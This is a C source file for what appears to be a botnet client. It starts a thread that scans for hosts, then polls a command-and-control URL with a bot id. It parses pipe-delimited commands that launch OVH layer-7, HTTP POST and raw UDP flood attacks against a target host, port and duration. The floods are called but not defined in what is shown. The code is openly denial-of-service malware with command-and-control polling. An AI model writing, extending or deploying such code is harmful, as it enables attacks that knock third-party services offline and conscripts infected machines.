#include "includes/px_botnet.h"

in_addr_t	addr;

void ft_manage_request(char *ptr)
{
	char **split;

	printf("test : %s\n", ptr);
	split = ft_split(ptr, '|');
	if (split[0] && split[1] && split[2] && split[3])
	{
		printf("----------\n");
		printf(".%d.\n", rand() % 100);
		printf(".%s.\n", split[0]);
		printf(".%s.\n", split[1]);
		printf(".%s.\n", split[2]);
		printf(".%s.\n", split[3]);
		printf("----------\n");
		if (ft_strncmp(split[0], "OVHL7", 5) == 0) //Already forked
		{
			printf("ovhl7 %ld\n", time(NULL));
			OVHL7(split[1], atoi(split[2]), atoi(split[3]), 4);
			printf("le main je sort de ovhl7 %ld\n", time(NULL));
			sleep(30);
		}
		else if (ft_strncmp(split[0], "HTTP", 5) == 0) //Already forked
		{
			printf("HTTTP %ld\n", time(NULL));
			HTTP("POST", split[1], atoi(split[2]), "/", atoi(split[3]), 500);
			printf("le main je sort de HTTP %ld\n", time(NULL));
			exit(0);
			sleep(30);
		}
		else if (ft_strncmp(split[0], "UDPRAW", 5) == 0) //Not forked
		{
			printf("UDPRAW %ld\n", time(NULL));
			UDPRAW(split[1], atoi(split[2]), atoi(split[3]));
			printf("le main je sort de UDPRAW %ld\n", time(NULL));
			sleep(30);
		}
	}
	ft_free_split(split);
}

int main(int argc, char *argv[])
{
	pthread_t ip_searcher;
	char *id;
	char *request;
	char *tmp;

	//argv[0] = "uwu";
	addr = inet_addr("8.8.8.8");
	id = ft_get_id();
	if (pthread_create(&ip_searcher, NULL, (void *)&ft_scan_world, NULL))
		pthread_join(ip_searcher, NULL);
	while (true)
	{
		request = ft_strjoin("?id=", id);
		request = ft_strnjoinf(url_page, request, strlen(request));
		tmp = ft_request(request);
		if (tmp)
			ft_manage_request(tmp);
		free(request);
		if (DEBUG)
			usleep(250000);
		else
			sleep(rand() % 3);
	}
	return (0);
}